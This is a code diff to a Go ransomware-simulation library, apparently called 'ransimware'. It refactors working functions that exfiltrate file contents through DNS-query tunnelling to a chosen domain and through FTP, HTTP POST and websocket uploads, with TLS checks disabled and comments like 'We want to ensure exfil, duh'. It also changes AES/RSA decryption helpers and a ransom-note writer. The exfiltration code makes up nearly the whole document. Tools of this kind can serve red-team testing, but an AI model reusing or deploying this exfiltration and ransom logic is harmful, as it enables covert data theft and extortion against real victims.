@@ -27,20 +27,22 @@ import (
 	"github.com/mjwhitta/inet"
 )
 
-// DefaultEncrypt is the default encryption behavior.
-var DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
-	return b, nil
-}
+var (
+	// DefaultEncrypt is the default encryption behavior.
+	DefaultEncrypt = func(path string, b []byte) ([]byte, error) {
+		return b, nil
+	}
 
-// DefaultExfil is the default exfil behavior.
-var DefaultExfil = func(path string, b []byte) error {
-	return nil
-}
+	// DefaultExfil is the default exfil behavior.
+	DefaultExfil = func(path string, b []byte) error {
+		return nil
+	}
 
-// DefaultNotify is the default notify behavior.
-var DefaultNotify = func() error {
-	return nil
-}
+	// DefaultNotify is the default notify behavior.
+	DefaultNotify = func() error {
+		return nil
+	}
+)
 
 // AESDecrypt will return a function pointer to an EncryptFunc that
 // actually decrypts using the specified password.
@@ -62,11 +64,10 @@ func AESDecrypt(passwd string) EncryptFunc {
 		}
 
 		// Ensure the file was encrypted with ransimware
-		for i := range aes.BlockSize {
-			if iv[i] != b[i] {
-				return b, nil
-			}
+		if !bytes.HasPrefix(b, iv[:aes.BlockSize]) {
+			return b, nil
 		}
+
 		b = b[aes.BlockSize:]
 
 		stream = cipher.NewCTR(block, iv[:aes.BlockSize])
@@ -112,24 +113,24 @@ func Base64Encode(_ string, b []byte) ([]byte, error) {
 // DNSResolvedExfil will return a function pointer to an ExfilFunc
 // that exfils by sending DNS queries to the authoritative nameserver
 // for the specified domain.
-func DNSResolvedExfil(domain string) (ExfilFunc, error) {
-	var f ExfilFunc = func(path string, b []byte) error {
+func DNSResolvedExfil(domain string) ExfilFunc {
+	return func(path string, b []byte) error {
 		var b64 string
-		var data []byte = append([]byte(path+" "), b...)
-		var done bool
 		var e error
-		var fqdn string
-		var label string
-		var leftover string
-		var max int = 253 - len(domain) - 1
+		var label strings.Builder
+		var labels []string
+		var maxDNS int = 255 - len(domain) - 1 // From RFC
+		var maxLabel int = 63                  // From RFC
+		var req strings.Builder
+		var reqs []string
 		var special map[byte]string = map[byte]string{
-			'+': ".plus",
-			'/': ".slash",
-			'=': ".equal",
+			'+': "plus",
+			'/': "slash",
+			'=': "equal",
 		}
-		var stream *bytes.Reader
+		var stream *strings.Reader
 		var tmp byte
-		var uuid [24]byte
+		var uuid [4]byte
 
 		// Get UUID
 		if _, e = rand.Read(uuid[:]); e != nil {
@@ -137,64 +138,73 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 		}
 
 		// Base64 encode data
-		b64 = base64.StdEncoding.EncodeToString(data)
-		stream = bytes.NewReader([]byte(b64))
+		if path != "" {
+			b = append([]byte(path+"\n"), b...)
+		}
 
-		// Stream data via DNS queries
-		for !done || (leftover != "") {
-			// Account for leftover from last loop
-			fqdn = hex.EncodeToString(uuid[:]) + leftover
-			leftover = ""
+		b64 = base64.StdEncoding.EncodeToString(b)
+		stream = strings.NewReader(b64)
 
-			// Create fqdn
-			for !done {
-				// Create label
-				label = ""
-				for !done {
-					// Read 1 byte at a time
-					if tmp, e = stream.ReadByte(); e == io.EOF {
-						done = true
-						break
-					} else if e != nil {
-						e = errors.Newf("failed reading data: %w", e)
-						return e
-					}
-
-					// Check for special chars
-					if _, ok := special[tmp]; ok {
-						if len(fqdn+"."+label+special[tmp]) > max {
-							leftover = special[tmp]
-						} else {
-							label += special[tmp]
-						}
-
-						break
-					} else {
-						label += string(tmp)
-					}
-
-					// Check label length
-					if len(label) >= 63 {
-						break
-					}
-				}
-
-				// Check fqdn length
-				if len(fqdn+"."+label) > max {
-					leftover = "." + label
-					break
-				} else {
-					fqdn += "." + label
-				}
+		// Create all labels
+		for {
+			// Read 1 byte at a time
+			if tmp, e = stream.ReadByte(); e == io.EOF {
+				break
+			} else if e != nil {
+				return errors.Newf("failed reading data: %w", e)
 			}
 
-			_, _ = net.LookupIP(fqdn + "." + domain)
+			// Check for special chars
+			if _, ok := special[tmp]; ok {
+				if label.Len() > 0 {
+					labels = append(labels, label.String())
+					label.Reset()
+				}
+
+				labels = append(labels, special[tmp])
+
+				continue
+			}
+
+			// Check label length
+			if label.Len()+1 > maxLabel {
+				labels = append(labels, label.String())
+				label.Reset()
+			}
+
+			label.WriteByte(tmp)
+		}
+
+		if label.Len() > 0 {
+			labels = append(labels, label.String())
+			label.Reset()
+		}
+
+		// Create DNS requests
+		req.WriteString(hex.EncodeToString(uuid[:]))
+
+		for _, lbl := range labels {
+			if req.Len()+len(lbl)+1 > maxDNS {
+				req.WriteString("." + domain)
+				reqs = append(reqs, req.String())
+				req.Reset()
+				req.WriteString(hex.EncodeToString(uuid[:]))
+			}
+
+			req.WriteString("." + lbl)
+		}
+
+		req.WriteString("." + domain)
+		reqs = append(reqs, req.String())
+		req.Reset()
+
+		for _, fqdn := range reqs {
+			// Ignore errors, just exfil
+			_, _ = net.LookupIP(fqdn)
 		}
 
 		return nil
 	}
-
-	return f, nil
 }
 
 // FTPExfil will return a function pointer to an ExfilFunc that
@@ -216,17 +226,21 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 
 	// Connect to FTP server
 	if !secure {
+		//nolint:mnd // 5 secs
 		c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
 	} else {
 		// Skip verify in case user is using self-signed cert
 		c, e = ftp.Dial(
 			dst,
+			//nolint:mnd // 5 secs
 			ftp.DialWithTimeout(5*time.Second),
 			ftp.DialWithExplicitTLS(
+				//nolint:gosec // G402 - We want to ensure exfil, duh
 				&tls.Config{InsecureSkipVerify: true},
 			),
 		)
 	}
+
 	if e != nil {
 		return nil, errors.Newf("failed FTP connection: %w", e)
 	}
@@ -237,12 +251,14 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 	}
 
 	f = func(path string, b []byte) error {
-		if strings.HasPrefix(path, "/") {
-			path = strings.Replace(path, "/", "", 1)
+		if path == "" {
+			path = "exfil"
 		}
 
 		// Fix slashes
 		path = filepath.ToSlash(path)
+		path = strings.TrimPrefix(path, "//")
+		path = strings.TrimPrefix(path, "/")
 
 		m.Lock()
 		defer m.Unlock()
@@ -250,10 +266,8 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 		// Make dirs
 		_ = c.MakeDirRecur(filepath.Dir(path))
 
-		// Upload file
-		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
-			return errors.Newf("failed to upload %s: %w", path, e)
-		}
+		// Ignore errors, just exfil
+		_ = c.Stor(path, bytes.NewReader(b))
 
 		return nil
 	}
@@ -279,23 +293,32 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 		var c *ftp.ServerConn
 		var e error
 
-		if strings.HasPrefix(path, "/") {
-			path = strings.Replace(path, "/", "", 1)
+		if path == "" {
+			path = "exfil"
 		}
+
+		// Fix slashes
+		path = filepath.ToSlash(path)
+		path = strings.TrimPrefix(path, "//")
+		path = strings.TrimPrefix(path, "/")
 
 		// Connect to FTP server
 		if !secure {
+			//nolint:mnd // 5 secs
 			c, e = ftp.Dial(dst, ftp.DialWithTimeout(5*time.Second))
 		} else {
 			// Skip verify in case user is using self-signed cert
 			c, e = ftp.Dial(
 				dst,
+				//nolint:mnd // 5 secs
 				ftp.DialWithTimeout(5*time.Second),
+				//nolint:gosec // G402 - We want to ensure exfil, duh
 				ftp.DialWithExplicitTLS(
 					&tls.Config{InsecureSkipVerify: true},
 				),
 			)
 		}
+
 		if e != nil {
 			return errors.Newf("failed FTP connection: %w", e)
 		}
@@ -305,16 +328,11 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 			return errors.Newf("failed to login: %w", e)
 		}
 
-		// Fix slashes
-		path = filepath.ToSlash(path)
-
 		// Make dirs
 		_ = c.MakeDirRecur(filepath.Dir(path))
 
-		// Upload file
-		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
-			return errors.Newf("failed to upload %s: %w", path, e)
-		}
+		// Ignore errors, just exfil
+		_ = c.Stor(path, bytes.NewReader(b))
 
 		return nil
 	}
@@ -324,24 +342,24 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 
 // HTTPExfil will return a function pointer to an ExfilFunc that
 // exfils via HTTP POST requests with the specified headers.
-func HTTPExfil(
-	dst string,
-	headers map[string]string,
-) (ExfilFunc, error) {
-	var f ExfilFunc = func(path string, b []byte) error {
+func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
+	return func(path string, b []byte) error {
 		var b64 string
 		var data []byte
 		var e error
 		var n int
 		var req *http.Request
+		var res *http.Response
 		var stream *bytes.Reader = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
 		if t, ok := http.DefaultTransport.(*http.Transport); ok {
 			if t.TLSClientConfig == nil {
+				//nolint:gosec // G402 - Not a problem
 				t.TLSClientConfig = &tls.Config{}
 			}
 
+			// We want to ensure exfil
 			t.TLSClientConfig.InsecureSkipVerify = true
 		}
 
@@ -356,19 +374,18 @@ func HTTPExfil(
 			}
 
 			// Create request body
-			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
-
+			data = tmp[:n]
 			if path != "" {
-				data = []byte(path + " " + b64)
-			} else {
-				data = []byte(b64)
+				data = append([]byte(path+"\n"), data...)
 			}
+
+			b64 = base64.StdEncoding.EncodeToString(data)
 
 			// Create request
 			req, e = http.NewRequest(
 				http.MethodPost,
 				dst,
-				bytes.NewBuffer(data),
+				strings.NewReader(b64),
 			)
 			if e != nil {
 				e = errors.Newf("failed to craft HTTP request: %w", e)
@@ -380,33 +397,24 @@ func HTTPExfil(
 				req.Header.Set(k, v)
 			}
 
-			// Send Message and ignore response or errors
-			_, _ = inet.DefaultClient.Do(req)
+			// Ignore errors, just exfil
+			res, _ = inet.DefaultClient.Do(req)
+			_ = res.Body.Close()
 		}
 	}
-
-	return f, nil
 }
 
 // RansomNote will return a function pointer to a NotifyFunc that
 // appends the specified text to the specified file.
 func RansomNote(path string, text ...string) NotifyFunc {
-	return func() error {
-		var e error
-		var f *os.File
-
-		f, e = os.OpenFile(
-			path,
-			os.O_APPEND|os.O_CREATE|os.O_RDWR,
-			0o644,
+	return func() (e error) {
+		e = os.WriteFile(
+			filepath.Clean(path),
+			[]byte(strings.Join(text, "\n")),
+			0o600, //nolint:mnd // u=rw,go=-
 		)
 		if e != nil {
-			return errors.Newf("failed to open %s: %w", path, e)
-		}
-		defer f.Close()
-
-		for _, line := range text {
-			_, _ = f.WriteString(line + "\n")
+			return errors.Newf("failed to write to %s: %w", path, e)
 		}
 
 		return nil
@@ -428,9 +436,10 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 		var ptxt []byte
 
 		// Ensure the file was encrypted with ransimware
-		if string(b[:10]) != "ransimware" {
+		if !bytes.HasPrefix(b, []byte("ransimware")) {
 			return b, nil
 		}
+
 		ctxt = b[10:]
 
 		// Get key for AES decryption
@@ -438,6 +447,7 @@ func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
 			if c == '\n' {
 				b64 = ctxt[:i]
 				ctxt = ctxt[i+1:]
+
 				break
 			}
 		}
@@ -516,7 +526,7 @@ func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
 }
 
 func wait(t time.Time, waitEvery, waitFor time.Duration) time.Time {
-	if (waitEvery > 0) && (time.Since(t) > waitEvery) {
+	if (waitEvery > 0) && (time.Since(t) >= waitEvery) {
 		time.Sleep(waitFor)
 		return time.Now()
 	}
@@ -537,6 +547,7 @@ func WebsocketExfil(
 	var f ExfilFunc
 	var hdrs http.Header
 	var m *sync.Mutex = &sync.Mutex{}
+	var res *http.Response
 	var tmp *url.URL
 
 	// Set headers
@@ -546,6 +557,7 @@ func WebsocketExfil(
 
 	// Skip verify in case user is using self-signed cert
 	dialer = ws.DefaultDialer
+	//nolint:gosec // G402 - We want to ensure exfil, duh
 	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	// Use proxy if provided
@@ -558,26 +570,28 @@ func WebsocketExfil(
 	}
 
 	// Connect to Websocket
-	if c, _, e = dialer.Dial(dst, hdrs); e != nil {
+	if c, res, e = dialer.Dial(dst, hdrs); e != nil {
 		return nil, errors.Newf("failed Websocket connection: %w", e)
 	}
 
+	_ = res.Body.Close()
+
 	f = func(path string, b []byte) error {
-		var b64 string = base64.StdEncoding.EncodeToString(b)
-		var data []byte
-		var e error
+		var b64 string
 
 		if path != "" {
-			data = []byte(path + " " + b64)
-		} else {
-			data = []byte(b64)
+			b = append([]byte(path+"\n"), b...)
 		}
 
-		m.Lock()
-		e = c.WriteMessage(ws.TextMessage, data)
-		m.Unlock()
+		b64 = base64.StdEncoding.EncodeToString(b)
 
-		return e
+		m.Lock()
+		defer m.Unlock()
+
+		// Ignore errors, just exfil
+		_ = c.WriteMessage(ws.TextMessage, []byte(b64))
+
+		return nil
 	}
 
 	return f, nil
@@ -603,6 +617,7 @@ func WebsocketParallelExfil(
 
 	// Skip verify in case user is using self-signed cert
 	dialer = ws.DefaultDialer
+	//nolint:gosec // G402 - We want to ensure exfil, duh
 	dialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	// Use proxy if provided
@@ -615,13 +630,13 @@ func WebsocketParallelExfil(
 	}
 
 	f = func(path string, b []byte) error {
-		var b64 string = base64.StdEncoding.EncodeToString(b)
+		var b64 string
 		var c *ws.Conn
-		var data []byte
 		var e error
+		var res *http.Response
 
 		// Connect to Websocket
-		if c, _, e = dialer.Dial(dst, hdrs); e != nil {
+		if c, res, e = dialer.Dial(dst, hdrs); e != nil {
 			return errors.Newf("failed Websocket connection: %w", e)
 		}
 		defer func() {
@@ -629,16 +644,21 @@ func WebsocketParallelExfil(
 				ws.CloseMessage,
 				ws.FormatCloseMessage(ws.CloseNormalClosure, ""),
 			)
-			c.Close()
+			_ = c.Close()
 		}()
 
+		_ = res.Body.Close()
+
 		if path != "" {
-			data = []byte(path + " " + b64)
-		} else {
-			data = []byte(b64)
+			b = append([]byte(path+"\n"), b...)
 		}
 
-		return c.WriteMessage(ws.TextMessage, data)
+		b64 = base64.StdEncoding.EncodeToString(b)
+
+		// Ignore errors, just exfil
+		_ = c.WriteMessage(ws.TextMessage, []byte(b64))
+
+		return nil
 	}
 
 	return f, nil
